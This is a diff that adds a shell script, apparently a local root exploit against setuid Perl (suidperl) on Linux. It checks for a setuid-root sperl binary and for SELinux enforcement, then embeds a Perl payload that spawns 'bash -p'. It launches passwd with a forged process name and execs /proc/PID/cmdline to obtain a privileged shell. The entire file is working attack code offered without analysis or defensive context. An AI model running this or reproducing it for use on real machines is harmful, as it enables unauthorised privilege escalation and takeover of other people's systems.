@@ -1,0 +1,95 @@
+#!/bin/sh
+
+# make sure suidperl exists 
+# should be installed in same directory as perl
+perl=`which perl`
+if [ -z "$perl" ]; then
+	echo "can't find perl, quitting"
+	exit 1
+fi
+
+perldir=`dirname "$perl"`
+sperl=`find $perldir -name "sperl*" | head -n 1`
+if [ -z "$sperl" ]; then
+	echo "can't find setuid perl, quitting"
+	exit 1
+fi
+
+# must be setuid-root
+ls -l $sperl | egrep "^.rws" >/dev/null
+if [ $? -eq 1 ]; then
+	echo "$sperl is not setuid root, quitting"
+	exit 1
+fi
+	
+# Next check if SELinux is enabled
+# assume SELinux is enabled
+selinux=1
+
+# if the /etc/selinux/config file doesn't exist, SELinux most
+# likely is not in use on the machine
+if [ -f /etc/selinux/config ]; then
+	# check if SELinux is in enforcing mode, with the 
+	# getenforce command
+	getenforce="getenforce"
+	which getenforce >/dev/null 2>&1
+	if [ $? -eq 1 ]; then
+		# look for the command in some likely places
+		for dir in /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin; do
+			if [ -f $dir/getenforce ]; then
+				getenforce="$dir/getenforce"
+				break;
+			fi
+		done
+	fi
+
+	# run getenforce if we have it
+	if [ "$getenforce" ]; then
+		mode=`$getenforce | tr "[A-Z]" "[a-z]"`
+		if [ "$mode" == "enforcing" ]; then
+			echo "SELinux is enforcing."
+		else
+			selinux=0;
+		fi
+	else
+		echo "Can't determine if SELinux is enabled."
+	fi
+else
+	selinux=0
+fi
+
+if [ $selinux -eq 1 ]
+then
+	echo "If SELinux is enabled, the exploit will most likely"
+	echo "fail and a system log message will be generated."
+	echo -n "Continue anyway [y/n]? "
+	read resp
+	if [ "$resp" != "y" -a "$resp" != "Y" ]
+	then
+		echo "aborting"
+		exit 1
+	fi
+fi
+
+cmd=`echo -ne '#\041'$perl'
+$ENV{PATH}="/bin:/usr/bin:/sbin:/usr/sbin";
+$h{$ARGV[0]}=1;
+$pid=(keys(%h))[0];
+system("sh", "-c", "kill $pid");
+exec {"sh"} "bash", "-p";'`
+
+(
+	cd /proc/self
+	chmod 6755 cmdline
+	exec -a "$cmd" /usr/bin/passwd >/dev/null 2>&1 
+) & 
+
+PID=$!
+# give passwd time to load
+usleep 300000
+kill -0 $PID >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+	exec /proc/$PID/cmdline $PID	# exec to get rid of original command
+else
+	echo "failed"
+fi
